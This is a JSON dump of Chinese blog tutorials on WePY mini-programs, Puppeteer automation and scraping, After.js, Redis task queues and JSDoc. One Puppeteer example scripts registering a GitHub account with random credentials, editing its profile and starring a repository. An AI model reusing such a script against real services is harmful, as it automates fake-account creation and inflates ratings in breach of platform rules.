// \"&#123; name: 'xiao ming' &#125;\"&#125; 此外，推荐使用 qs 模块： 123456789101112import qs from 'qs';// ... 当前页wepy.navigateTo(&#123; url: 'home?' + qs.stringify(&#123; name: 'xiao ming', age: 20, &#125;),&#125;);// ... 目标页onLoad(query) &#123; console.log(query); // &#123; name: \"xiao ming\", age: \"20\" &#125;&#125; navigator12345&lt;view class=\"btn-area\"&gt; &lt;navigator url=\"/a\"&gt;跳转到新页面&lt;/navigator&gt; &lt;navigator url=\"/b\" open-type=\"redirect\"&gt;在当前页打开&lt;/navigator&gt; &lt;navigator url=\"/c\" open-type=\"switchTab\"&gt;切换 Tab&lt;/navigator&gt;&lt;/view&gt; wx.navigateTo保留当前页面，跳转到应用内的某个页面，使用 wx.navigateBack 可以返回到原页面，使用 wx.redirectTo(options) 可以实现替换转跳。 123456wx.navigateTo(&#123; url: '', success: () =&gt; &#123;&#125;, fail: () =&gt; &#123;&#125;, complete: () =&gt; &#123;&#125;,&#125;) 事件在小程序里面没有 onClick 事件（对应的是 tap 事件），小程序的事件分为两种：bind 和 catch，它们的区别是：bind 不会阻止冒泡事件，catch 可以阻止冒泡事件。 使用 Wepyhttps://tencent.github.io/wepy/ 使用 Mixinmixin 能实现类似继承的效果，在函数式编程里更推荐使用 mixin 而不是继承。 在 Wepy 里使用 mixin 先是定义一个 mixin 类，再接着在组件里导入 mixin。 12345678910111213import wepy from 'wepy'export default class testMixin extends wepy.mixin &#123; data = &#123; mixin: 'This is mixin data.' &#125; onShow() &#123; console.log('mixin onShow') &#125; onLoad() &#123; console.log('mixin onLoad') &#125;&#125; 在组件里导入 mixin。 12345import TestMixin from '../mixins/testmixin';export default class Home extends wepy.page &#123; mixins = [TestMixin];&#125; 使用 Redux在 Wepy 里也可以使用 Redux，那么下面来看看怎么结合使用。首先安装 Wepy 专属的 Redux 连接器，就像 React-Redux 一样。 1yarn add wepy-redux 使用 Redux 分为几个步骤： 定义 Reducers 创建 Store 定义 Actions 连接 Components 定义 Reducers先定义一个 reducers，reducers 应该是一个函数。 1234567891011// reducers.jsconst root_state = &#123; list: ['xiao', 'ming'],&#125;export default (state = root_state, action) =&gt; &#123; if (action.type === \"DEFAULT\" &amp;&amp; typeof action.newState === 'function') &#123; return action.newState(state, root_state) || state; &#125; return state;&#125; 创建 Store创建 Store，需要在 app.wpy 里创建。 123456789101112131415161718192021import &#123; createStore, combineReducers, applyMiddleware,&#125; from 'redux';import thunk from 'redux-thunk';import logger from 'redux-diff-logger';import &#123; setStore &#125; from 'wepy-redux';import * as reducers from './reducers';export default class extends wepy.app &#123; constructor() &#123; super(); const store = createStore( combineReducers(reducers), applyMiddleware(thunk, logger), ); setStore(store); // ... &#125;&#125; 同时，我推荐你使用笔者封装的 create store 库：redux-store-init， 少写点初始化代码。 123456import Store from 'redux-store-init';import * as reducers from './reducers';import thunk from 'redux-thunk';import logger from 'redux-diff-logger';const store = Store(&#123; reducers &#125;, [thunk, logger]); 定义 Actions定义一个 Action。 1234export const add = str =&gt; (&#123; type: 'DEFAULT', newState: state =&gt; (&#123; ...state, list: state.list.concat([str]) &#125;)&#125;); 因为使用了 redux-thunk，action 也可以写成： 123456export const add = str =&gt; dispatch =&gt; &#123; dispatch(&#123; type: 'DEFAULT', newState: state =&gt; (&#123; ...state, list: state.list.concat([str]) &#125;) &#125;);&#125;; 连接 Components连接组件需要使用装饰器来连接，第一个参数为 state，第二个参数为 actions，都为对象形式。 12345678910111213import wepy from 'wepy';import &#123; connect &#125; from 'wepy-redux';import * as actions from './actions';@connect(&#123; state: state =&gt; state.default &#125;, actions)export default class Home extends wepy.page &#123; methods = &#123; btnClick() &#123; console.log(this.state); // &#123; name: 'aaa' &#125; this.methods.add('aers'); &#125; &#125;&#125; 组件定义不多说，和 Vue 差不多。 1234567891011121314151617181920212223242526272829303132333435import wepy from 'wepy';export default class Model extends wepy.component &#123; config = &#123; navigationBarTitleText: 'test' &#125; mixins = [testMixin] props = &#123; num: &#123; type: [Number, String], coerce: function(v) &#123; return +v &#125;, default: 50 &#125; &#125; data = &#123; mynum: 20, userInfo: &#123; nickName: '加载中...' &#125;, &#125; computed = &#123; // 计算 &#125; events = &#123; // 事件 &#125; watch = &#123; // 监听 &#125; methods = &#123; // 方法 &#125;&#125; 生命周期在 Wepy 里组件遵循的是小程序的生命周期而不是 Vue 里的生命周期。 props 传值坑粑粑的，Wepy props 传值还分动态与静态传值。 静态传值：顾名思义，在组件第一次接受到值之后就不会更新 props 了。常见使用 &lt;model :show=&quot;show&quot;&gt; 动态传值 单向传值：在父组件更新 props 之后，子组件会重新渲染，只能是从父组件影响子组件。常见使用：&lt;model :show.sync=&quot;show&quot;/&gt; 双向传值：实现父组件与子组件，实现双向数据绑定。常见使用，在子组件 props 里添加 twoWay: true，例如：12345twoWayTitle: &#123; type: Number, default: 'nothing', twoWay: true&#125; 事件自定义事件需要使用 .user，并且是通过 $emit 触发的（真麻烦，还是 React 好，一个回调完事）。 123456789101112131415161718192021222324252627282930313233343536373839// index.wpy 父组件&lt;template&gt; &lt;Model :show.sync=\"show\" @close.user=\"close\"&gt; dad &lt;/Model&gt;&lt;/template&gt;&lt;script&gt;export default class Home extends wepy.page &#123; data = &#123; show: false, &#125; methods = &#123; close() &#123; this.show = false; &#125; &#125;&#125;&lt;/script&gt;// model.wpy 子组件&lt;template&gt; &lt;view @tap.stop=\"onClose\" data-name=\"model\"&gt; &lt;/view&gt;&lt;/template&gt;&lt;script&gt;import wepy from 'wepy';export default class Model extends wepy.component &#123; methods = &#123; onClose(e) &#123; if (e.currentTarget.dataset.name === e.target.dataset.name) &#123; this.$emit('close'); // 触发 @close 绑定的函数 &#125; &#125; &#125;&#125;&lt;/script&gt;","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"Puppeteer 使用指南","slug":"抓包&爬虫/Puppeteer 使用指南","date":"2018-04-22T11:39:08.000Z","updated":"2021-06-15T06:10:52.917Z","comments":true,"path":"/stories/2018/04/抓包&爬虫/Puppeteer 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/抓包&爬虫/Puppeteer 使用指南/","excerpt":"前言前端自动化测试是一个很复杂以及涉及面广阔的知识点，同时也是前端工程化重要的分支，讲究的是自动化与智能模拟测试。Puppeteer 是一个可用于前端自动化测试的工具 ……","text":"前言前端自动化测试是一个很复杂以及涉及面广阔的知识点，同时也是前端工程化重要的分支，讲究的是自动化与智能模拟测试。Puppeteer 是一个可用于前端自动化测试的工具 …… PuppeteerPuppeteer 是一个 Chrome 开发团队推出的一个无头浏览器库，可以让开发者在 Nodejs 里调 Chrome 的 API 来操纵 Web 应用。Puppeteer 类似于 Selenium 或是 PhantomJs，但它不同的是它的操作 Dom 可以完全在内存中进行模拟既在 V8 引擎中处理而不打开浏览器，可以认为这是一个真实存在而看不见的浏览器外壳。 Puppeteer 的使用方式与 PhantomJs，如果使用过从 PhantomJs 过渡到 Puppeteer 几乎是没有任何的难度。 可参考 PhantomJs 的相关文章： Phantomjs 简明的使用教程。 安装：1yarn add puppeteer 安装，在国内环境会被墙，解决方案参考：puppeteer/issues/1597，也可以像笔者一样，开蓝灯后 yarn 安然无恙的安装。 下面介绍 puppeteer 的基本使用方式。此外，推荐看一个很好的示例库：puppeteer-examples。 页面截图下面使用 puppeteer 来对百度进行截图，并保存到本地。 123456789const puppeteer = require('puppeteer');+ async function () &#123; const browser = await puppeteer.launch(); // 启动一个浏览器 const page = await browser.newPage(); // 加载一个页面标签 await page.goto('https://www.baidu.com'); // 访问某个页面 await page.screenshot(&#123; path: 'baidu.png' &#125;); // 截图并保存在本地 await browser.close(); // 关闭浏览器（释放内存）&#125;(); 在默认情况下，使用的是 headless 模式（无头浏览器），也可以不使用 headless，在 launch 里设置 headless 为 false 即可。 1puppeteer.launch(&#123; headless: false &#125;); 在上面的示例里可以看到截图的大小是 800px * 600px，那是 puppeteer 默认的窗口大小，同样也可以自己设置。 12const page = await browser.newPage();page.setViewport(&#123; width: 1920, height: 1080 &#125;); 参考 API：page.setViewport 保存 PDF在 Chrome 里所有功能 Puppeteer 都支持，包括把页面保存成 PDF，也没问题。 123456789const puppeteer = require('puppeteer');+ async function () &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto( 'https://www.baidu.com'); await page.pdf(&#123; path: 'hn.pdf', format: 'A4' &#125;); await browser.close();&#125; (); 参考 API：page.pdf 页面 DOM 操作下面代码表明如何获取页面的 title 标签的值。通过上下文传参数，进行数据的交互。 12345678910111213141516171819const puppeteer = require('puppeteer');+ async function () &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto('https://www.baidu.com'); // 监听 console 输出 page.on(\"console\", (msgobj) =&gt; console.log(\"PAGE LOG:\", msgobj)); const dimensions = await page.evaluate((&#123; selector &#125;) =&gt; &#123; const title = document.querySelector(selector).innerText; console.log(title); return &#123; title &#125;; &#125;, &#123; selector: 'head &gt; title' &#125;); console.log('Dimensions:', dimensions); await browser.close();&#125; (); 输出的结果： 12345678910PAGE LOG: ConsoleMessage &#123; _type: 'log', _text: '百度一下，你就知道', _args: [ JSHandle &#123; _context: [ExecutionContext], _client: [CDPSession], _remoteObject: [Object], _disposed: false &#125; ] &#125;Dimensions: &#123; title: '百度一下，你就知道' &#125; 因为 console 事件返回的是序列化信息，所以可以根据对应的关系，映射到 nodejs 里的 console 对象上。 1page.on(\"console\", msgobj =&gt; console[msgobj._type]('PAGE Print:', msgobj._text)); page 还提供了，几个便捷的查询 API。 page.$ page.$$ page.$eval page.$$eval 加载 script/stylepuppeteer 提供 page.addScriptTag 和 page.addStyleTag 用于额外的加载脚本与样式。 123456await page.addScriptTag(&#123; url: 'https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js', path: '', // 本地 js 文件路径 content: '', // 上下文，可以是 js 代码 type: '', // module 为 ES6 模块&#125;); 模拟行为下面，首先是打开 360 搜索的主页，接着在输入框里输入 puppeteer 关键件，并且点击搜索按钮提交。最后等待页面跳转后，把结果内容输出。 1234567891011121314151617181920212223242526272829const puppeteer = require(\"puppeteer\");+ async function () &#123; const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.goto(\"https://www.so.com/\", &#123; waitUntil: \"networkidle2\" &#125;); page.on(\"console\", msgobj =&gt; console[msgobj._type]('PAGE Print:', msgobj._text)); await page.evaluate(() =&gt; &#123; const kw = document.getElementById('input'); kw.value = 'puppeteer'; console.log(kw.value); &#125;); await page.click(\"#search-button\"); await page.waitForNavigation(&#123; waitUntil: \"networkidle2\" &#125;); console.log(page.url()); console.log(await page.title()); const result = await page.evaluate(() =&gt; &#123; const resEl = document.querySelector('ul.result').querySelectorAll('.res-title'); const list = Array.from(resEl); return list.map(i =&gt; i.innerText); &#125;); console.log(result); await browser.close();&#125; (); 运行的结果： 123456789101112PAGE Print: puppeteerhttps://www.so.com/s?ie=utf-8&amp;fr=none&amp;src=360sou_newhome&amp;q=puppeteerpuppeteer_360搜索[ 'Puppeteer的入门教程和实践- 任乃千- 简书', 'puppeteer - npm', '如何成为Puppeteer大师', 'GitHub - GoogleChrome/puppeteer: Headless Chrome Node API', 'PS3《Puppeteer》将出中文版9月上市_电视游戏_新浪游戏_新浪网', 'puppeteer学习(一)——puppeteer与Chrome Headless - zrxJuly - ...', 'Puppeteer--UI自动化测试初探- CNode技术社区', 'Puppeteer 入门教程- 小一辈无产阶级码农', '自动爬取SF文章并推荐到掘金--Puppeteer再探- CSDN博客' ]; 相关 API： page.click(selector) page.hover(selector) page.mouse(selector) page.touchscreen(selector) page.focus(selector) page.keyboard 其外还可以使用 ElementHandle 类。 12345678const puppeteer = require('puppeteer');puppeteer.launch().then(async browser =&gt; &#123; const page = await browser.newPage(); await page.goto('https://www.baidu.com'); const inputElement = await page.$('input[type=submit]'); await inputElement.click();&#125;); 爬取数据下面一个示例展示了如何爬取腾讯天气的天气数据。 12345678910111213141516171819202122232425262728const puppeteer = require(\"puppeteer\");const devices = require('puppeteer/DeviceDescriptors');const iPhone = devices['iPhone 6']; // 设备 user-agent 信息+ async function () &#123; console.time('run'); // 1 start const browser = await puppeteer.launch(); const page = await browser.newPage(); await page.emulate(iPhone); // 1 end // 2 start await page.goto(\"http://weather.news.qq.com/\", &#123; waitUntil: \"networkidle2\" &#125;); page.on(\"console\", msgobj =&gt; console[msgobj._type]('PAGE Print:', msgobj._text)); // 2 end // 3 start const res = await page.evaluate(() =&gt; (&#123; city: $('#txt-cur-location').text(), // 城市 time: $('#txt-pub-time').text(), // 时间 temperature: $('#txt-temperature').text(), // 温度 humidity: $('#txt-humidity').text(), // 湿度 kPa: $('#txt-kPa').text(), // 帕斯卡 wind: $('#txt-wind').text(), // 风向 &#125;)); console.log(res); // 3 end await browser.close();&#125; (); 性能与分析在上面的爬取腾讯天气数据的示例里，在 1 阶段使用了 2143.250ms 的时间，在 2 阶段使用了 2707.230ms 的时间，在 3 阶段使用了 18.688ms 的时间。 很明显，puppeteer 在加载时需要一定的时间，而通常网络上的加载数据以及 DOM 的加载速度占主要的消耗时间。因此，可以从两方面去优化性能： 复用 browser 对象，browser 对象是一个浏览器对象，可以使用 browser 创建无数个页面，在一定条件下尽量复用 browser。 优化页面加载性能，这部分是前端的事情了。 对于分析来说 Chrome 提供了 Trace API，在 puppeteer 里同样也可以使用。 123await page.tracing.start(&#123; path: './data/trace/trace.json' &#125;);await page.goto('http://www.baidu.com');await page.tracing.stop(); 在分析完成后，在 Chrome 里导入 json 文件查看分析结果。 调试技巧无论如何调试都是很困难的，puppeteer 也一样如此，为了能够方便调试，列出了以下技巧。 关掉无界面模式，有时查看浏览器显示的内容是很有用的。 1puppeteer.launch(&#123; headless: false &#125;); 减慢速度，slowMo 选项以指定的毫秒减慢 puppeteer 的操作。 1234puppeteer.launch(&#123; headless: false, slowMo: 250,&#125;); 捕获 console 的输出，通过监听 console 事件。在 page.evaluate 里调试代码时这也很方便。 12page.on('console', msg =&gt; console[msgobj._type]('PAGE Print:', msgobj._text););await page.evaluate(() =&gt; console.log(`url is $&#123;location.href&#125;`)); 启动详细日志记录，所有公共 API 调用和内部协议流量都将通过 puppeteer 命名空间下的 debug 模块进行记录。 12345678# Basic verbose loggingenv DEBUG=\"puppeteer:*\" node script.js# Debug output can be enabled/disabled by namespaceenv DEBUG=\"puppeteer:*,-puppeteer:protocol\" node script.jsenv DEBUG=\"puppeteer:session\" node script.jsenv DEBUG=\"puppeteer:mouse,puppeteer:keyboard\" node script.jsenv DEBUG=\"puppeteer:*\" env DEBUG_COLORS=true node script.js 2&gt;&amp;1 | grep -v '\"Network' 前端自动化测试前端自动化测试与 puppeteer 息息相关，可以说它是前端自动化测试的一个必需品。 那么 Puppeteer 可以为前端自动化测试做些什么？ 应用加载性能。可以通过使用 puppeteer 对应用进行测试加载的时间。 业务逻辑自动化测试，通过页面截图，DOM 操作来测试业务功能是否具有完整性。 模拟（user-agent）多设备分辨率进行测试。 前端监控，用于作为前端监控的一个基础套件。 自动化实践示例下面一个示例展示的是使用 puppeteer 来注册一个 GitHub 账号，并在设置项里修改用户信息，最后去找一个开源库，点一个 Star。 理论上等待页面转跳完成使用的是 page.waitForNavigation 的 API，但是它有 BUG，请看：issues/257，所有这里暂时使用 wait(2000) 代替。 首先，解决第一步，注册一个 GitHub 账号。 123456789101112131415161718192021222324252627282930313233343536373839const puppeteer = require(\"puppeteer\");const randomString = require('crypto-random-string');function wait(time) &#123; return new Promise(rs =&gt; setTimeout(rs, time));&#125;+ async function () &#123; const browser = await puppeteer.launch(&#123; headless: false, slowMo: 0 &#125;);; const page = await browser.newPage(); // setting await page.deleteCookie(... await page.cookies()) page.setViewport(&#123; width: 1920, height: 1080 &#125;); page.on(\"console\", msgobj =&gt; console[msgobj._type]('Page Console:', msgobj._text)); // 去到首页 await page.goto('https://github.com/'); // 输入随机的帐号和密码 const data = &#123; ac: 'abc' + randomString(8), pw: randomString(12), email: 'abc' + randomString(6) + '@753.com', &#125;; await page.evaluate((&#123; ac, pw, email &#125;) =&gt; &#123; console.log(ac, pw, email); document.getElementById('user[login]').value = ac; document.getElementById('user[password]').value = pw; document.getElementById('user[email]').value = email; &#125;, data); // 注册它 await page.click('button[type=submit]'); await wait(2000); // page.waitForNavigation // next&#125; (); 当注册完成后，page 对象就会有记录 cookie 信息，那么不需要登录就可以去到设置页了。 12345678910// 设置内容await page.goto('https://github.com/settings/profile');await page.evaluate((&#123; company, location &#125;) =&gt; &#123; document.querySelector('#user_profile_company').value = company; document.querySelector('#user_profile_location').value = location;&#125;, &#123; company: \"Test\", location: \"Test\" &#125;);// 更新await page.click('button.btn.btn-primary[type=submit]');await wait(2000); 设置信息后，去搜索一个开源库，为它点一颗星。 123456789101112131415// 搜索，一个开源库const q = 'react';await page.goto(`https://github.com/search?utf8=%E2%9C%93&amp;q=$&#123;q&#125;`);// 搜索结果第一个await page.click('.repo-list-item h3 a');await wait(2000);// 点星await page.click('button.btn[title *= \"Star\"]');await wait(2000);// 观望 10 秒await wait(1000 * 10);await browser.close(); 好了，整个过程结束了。 参考资料 https://www.zhihu.com/question/29922082 https://developers.google.cn/web/tools/puppeteer/?hl=zh-cn http://www.infoq.com/cn/news/2017/09/how-belcome-Puppeteer-master https://www.jianshu.com/p/2f04f9d665ce","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"After：React + React Router 同构应用开发","slug":"同构/After/After：React + React Router 同构应用开发","date":"2018-04-22T05:50:14.000Z","updated":"2021-06-15T06:10:52.908Z","comments":true,"path":"/stories/2018/04/同构/After/After：React + React Router 同构应用开发/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/同构/After/After：React + React Router 同构应用开发/","excerpt":"前言同构即未来！就像 Next.js 一样，After.js 是一个使用 React 和 React Router 的一个同构应用开发框架。After 大量借鉴了 Next 的思想，相比 Next 而言却比较轻量级与灵活，可以基于 After 的基础上打造自己的同构框架。","text":"前言同构即未来！就像 Next.js 一样，After.js 是一个使用 React 和 React Router 的一个同构应用开发框架。After 大量借鉴了 Next 的思想，相比 Next 而言却比较轻量级与灵活，可以基于 After 的基础上打造自己的同构框架。 开始使用 After12345npm install -g create-razzle-appcreate-razzle-app --example with-afterjs myappcd myappnpm installnpm start # http://127.0.0.1:3000 数据提取在 After 里有很多东西是参考 Next 的，同样提供了一个 getInitialProps 函数用于数据的初始化。 123456class About extends React.Component &#123; static async getInitialProps(&#123; req, res, match &#125;) &#123; const stuff = await CallMyApi(); return &#123; stuff &#125;; // this.props.stuff &#125;&#125; 所有在 getInitialProps 里返回的数据都会合并到组件的 props 里面。 同样的 getInitialProps 是一个同构 API，并不能在 getInitialProps 里面进行数据库操作和使用 DOM、Nodejs API 等。那么如何精确的获取数据？一般来说需要调用本机的 REST API 服务。 123async function CallMyApi() &#123; return fetch('http://127.0.0.1/api/user').then(res =&gt; res.json());&#125; 应该设置一个微服务： 123router.get('/api/user', ctx =&gt; &#123; ctx.body = 'xxx';&#125;) getInitialProps 的参数如下： req?： 仅限于服务端，request 对象。 res?： 仅限于服务端，response 对象。 match： React Router 4 的 match 对象。 history： React Router 4 的 history 对象。 location： 仅限于客户端，React Router 4 的 location 对象。 路由因为 After 是把 React 和 React-Router 4 结合到一起的，所以路由部分和 React-Router 4 一样。 代码拆分After 内置了 import() 的语法（也就是配置了 Webpack）。 123456789101112131415161718192021import React from 'react';import Home from './Home';import &#123; asyncComponent &#125; from '@jaredpalmer/after';export default [ // normal route &#123; path: '/', exact: true, component: Home, &#125;, // codesplit route &#123; path: '/about', exact: true, component: asyncComponent(&#123; loader: () =&gt; import('./About'), Placeholder: () =&gt; &lt;div&gt;...LOADING...&lt;/div&gt;, &#125;), &#125;,]; 自定义 Head创建一个 ./src/Document.js 可以用于自定义 Document。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import React from 'react';import &#123; ServerStyleSheet &#125; from 'styled-components';import &#123; AfterRoot, AfterData &#125; from '@jaredpalmer/after';export default class Document extends React.Component &#123; static async getInitialProps(&#123; assets, data, renderPage &#125;) &#123; const sheet = new ServerStyleSheet(); const page = await renderPage(App =&gt; props =&gt; sheet.collectStyles(&lt;App &#123;...props&#125; /&gt;)); const styleTags = sheet.getStyleElement(); return &#123; assets, data, ...page, styleTags&#125;; &#125; render() &#123; const &#123; helmet, assets, data, styleTags &#125; = this.props; // get attributes from React Helmet const htmlAttrs = helmet.htmlAttributes.toComponent(); const bodyAttrs = helmet.bodyAttributes.toComponent(); return ( &lt;html &#123;...htmlAttrs&#125;&gt; &lt;head&gt; &lt;meta httpEquiv=\"X-UA-Compatible\" content=\"IE=edge\" /&gt; &lt;meta charSet=\"utf-8\" /&gt; &lt;title&gt;Welcome to the Afterparty&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt; &#123;helmet.title.toComponent()&#125; &#123;helmet.meta.toComponent()&#125; &#123;helmet.link.toComponent()&#125; &#123;/** here is where we put our Styled Components styleTags... */&#125; &#123;styleTags&#125; &lt;/head&gt; &lt;body &#123;...bodyAttrs&#125;&gt; &lt;AfterRoot /&gt; &lt;AfterData data=&#123;data&#125;/&gt; &lt;script type=\"text/javascript\" src=&#123;assets.client.js&#125; defer crossOrigin=\"anonymous\" /&gt; &lt;/body&gt; &lt;/html&gt; ); &#125; 参考资料 https://github.com/jaredpalmer/after.js","categories":[{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/categories/同构/"}],"tags":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"},{"name":"Next","slug":"Next","permalink":"http://me.lizhooh.com/tags/Next/"},{"name":"同构","slug":"同构","permalink":"http://me.lizhooh.com/tags/同构/"}]},{"title":"对基于 Redis 分布式计算的研究","slug":"Redis/对基于 Redis 分布式计算的研究","date":"2018-04-18T03:38:12.000Z","updated":"2021-06-15T06:10:52.890Z","comments":true,"path":"/stories/2018/04/Redis/对基于 Redis 分布式计算的研究/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/Redis/对基于 Redis 分布式计算的研究/","excerpt":"前言所谓分布式计算是一门计算科学，它研究如何把一个需要非常巨大的计算能力才能解决的问题分成许多小的部分。","text":"前言所谓分布式计算是一门计算科学，它研究如何把一个需要非常巨大的计算能力才能解决的问题分成许多小的部分。 背景现在有海量的计算任务，每个任务都有自己的特点，每一个计算任务大概需要花费 100ms 的时间去计算。一开始在单台机器上部署了计算进程，但是发现总体的计算使用的时间非常长，1 万个计算任务总共需要花费 1000 秒的时间，尽管 CPU 使用率几乎接近 100%，但计算的速度还是不尽人意。 为了解决这个问题，接下来将使用 Redis 做分布式计算。为什么是 Redis 呢？实际上使用任何一个数据库都可以，相对来说使用 Redis 只是为了临时存储计算任务的信息数据。 设计如果把每个计算任务看成一个任务项，那么多个任务项可以组成一个队列或数组结构。每个任务项里多有许多的计算信息，比如计算的依赖参数等。 因此，这里将使用 Redis 的 List 结构存储计算任务信息，每一个 List 标记为一个任务项。并且分为 3 个队列： 待计算队列（AwaitQueue）：此队列里存放的是等待计算的队列任务。 计算中队列（ActiveQueue）：此队列的存放的是计算中的队列任务。 计算完成队列（CompleteQueue）：此队列里计算的是以完成的队列任务。 List 的 Item 是字符串结构，为了能够存储多个计算任务信息，需要把任务信息序列化与反序列化存储。 整个执行的流程如下：当需要计算时，从 AwaitQueue 里取一个任务项（pop）放到 ActiveQueue 里，标识为计算中。当计算结束后，从 ActiveQueue 里移至 CompleteQueue 里。 Redis 的责任是如何存储待计算、计算中、计算完成的关系，它本身并不负责计算任务。 Redis 里的计算任务信息结构为： 123456&#123; id: \"abc\", params: [], // 参数列表 result: \"\", // 结果 time: \"\", // 时间相关&#125; 当某个进程开始启动计算时，首先第一步是从 AwaitQueue 里出队一个项，入队 ActiveQueue，在计算完成后添加到 CompleteQueue 里。 实际上 ActiveQueue 并不能使用 List 结构，它只能使用 Set 结构，不然会难以在队列里找到当前的任务项。 具体示例代码如下： 123456789101112131415161718192021222324252627const Redis = require('ioredis');// 默认是 http://127.0.0.1:6379， 0 号数据库const redis = new Redis();// 初始化待计算队列const tasks = [... new Array(10)].map((i, index) =&gt; (&#123; id: index + 1, params: [1, 2], result: null, time: Date.now(),&#125;)).map(i =&gt; JSON.stringify(i));// 入队redis.rpush('await-queue', tasks);// 模拟+ async function() &#123; // 出队 const task = JSON.parse(await redis.lpop('await-queue')); // id await redis.sadd('active-queue', task.id); // 计算 await new Promise(rs =&gt; setTimeout(rs, 100)); // 完成 await redis.srem('active-queue', task.id); await redis.rpush('complete-queue', JSON.stringify(task));&#125;(); 在整个系统里会有一个计算任务发布的进程，相当于一个生产者的角色。当启动计算进程时，计算进程从 Redis 里拿到数据后计算，相当于消费者的角色。","categories":[{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/categories/Redis/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/tags/Redis/"}]},{"title":"使用 JSDoc 生成后端 API 文档","slug":"后端/使用 JSDoc 生成后端 API 文档","date":"2018-04-13T00:22:32.000Z","updated":"2021-06-15T06:10:52.911Z","comments":true,"path":"/stories/2018/04/后端/使用 JSDoc 生成后端 API 文档/","link":"","permalink":"http://me.lizhooh.com/stories/2018/04/后端/使用 JSDoc 生成后端 API 文档/","excerpt":"前言JSDoc 是一个可以根据规范化的注释、自动生成接口文档。包括参数说明、示例等。可以使用 JSDoc 记录如：命名空间，类，方法，方法参数等。 中文教程：JSDoc 介绍 基本使用新键一个 index.js 文件。 123npm install -g jsdocjsdoc index.js # outserve out # 5000","text":"前言JSDoc 是一个可以根据规范化的注释、自动生成接口文档。包括参数说明、示例等。可以使用 JSDoc 记录如：命名空间，类，方法，方法参数等。 中文教程：JSDoc 介绍 基本使用新键一个 index.js 文件。 123npm install -g jsdocjsdoc index.js # outserve out # 5000 在 index.js 里： 12345678910/** * Book类，代表一个书本. * @constructor * @param &#123;String&#125; title - 书本的标题. * @param &#123;String&#125; author - 书本的作者. */function Book(title, author) &#123; this.title = title; this.author = author;&#125; 运行后生成的文档： 说明： @constructor 指定为构造函数 @param 是参数，{String} 是参数类型 配置在根目录里创建一个 jsdoc.json 用于配置生成规则。 12345678910111213141516171819202122232425262728&#123; \"tags\": &#123; \"allowUnknownTags\": true, \"dictionaries\": [\"jsdoc\"] &#125;, \"source\": &#123; // 代码目录 \"include\": [\"lib\", \"package.json\", \"README.md\"], \"includePattern\": \".js$\", \"excludePattern\": \"(node_modules/|docs)\" &#125;, \"plugins\": [ \"plugins/markdown\" ], \"templates\": &#123; \"cleverLinks\": false, \"monospaceLinks\": true, \"useLongnameInNav\": false, \"showInheritedInNav\": true &#125;, \"opts\": &#123; \"destination\": \"./docs/\", \"encoding\": \"utf8\", \"private\": true, \"recurse\": true, \"template\": \"./node_modules/minami\" &#125;&#125; 配置你的 script： 12\"start\": \"jsdoc --configure jsdoc.json --verbose\",\"serve\": \"serve docs\" 具体参考参考：https://github.com/nijikokun/minami 推荐主题： minami docdash postman-jsdoc-theme 注释语法@file对文件的描述，用于文件的头部。 @author &lt;name&gt; [&lt;emailAddress&gt;]代码的作者，在姓名后面用尖括号加上邮箱会被自动转成 mailto: 的链接。 @copyright &lt;some copyright text&gt;与 @file 结合使用，说明版权相关的信息。 @license &lt;identifier&gt;说明许可证相关的信息。 @type {typeName} * 表示任何类型。 ? 表示可以为 null。 ! 表示不能为 null。 数组用 [] 表示。 类型有多种情况需用 | 进行分隔，并加上 ()。 可以使用 @callback 或 @typedef 定义的类型。 @property [&lt;type&gt;] [&lt;name&gt;] [some description]描述对象的属性。 @func [&lt;FunctionName&gt;]标识一个函数。 @param {&lt;type&gt;} name - some description 非必传参数需给参数名加上 []。 参数如有默认值需用 = 表示。 如果参数是 object，可继续用 @param 对其属性进行详细说明。 若干个参数用 …表示。 @returns {&lt;type&gt;} some description描述一个函数的返回值。 @namespace [{&lt;type&gt;}] &lt;SomeName&gt;]标识一个命名空间。 @desc &lt;some description&gt;对某个部分的详细描述和说明。 @summary &lt;some description&gt;对某个部分的简短描述和说明。 @constant [&lt;type&gt; &lt;name&gt;]标识常量。 @readonly仅仅是注释，JSDoc 不会去检查究竟是不是 readonly。 @default [&lt;some value&gt;]变量的初始值。 @enum [&lt;type&gt;]相同类型的集合。 @example使用示例，示例代码在文档中会被高亮显示。 @throws [{&lt;type&gt;} free-form description]表明这部分代码会抛出某个异常。 @todo todo后续需要做的事。 @borrows &lt;that namepath&gt; as &lt;this namepath&gt;可理解为复制注释，当有多个地方引用了同一个函数，只需在一处写好注释，然后用 @borrows 即可。 @callback &lt;namepath&gt;定义一个回调函数，和 @typedef 一样，是一种自定义类型。 @typedef [&lt;type&gt;] &lt;namepath&gt;定义一个自定义类型，定义后可以在 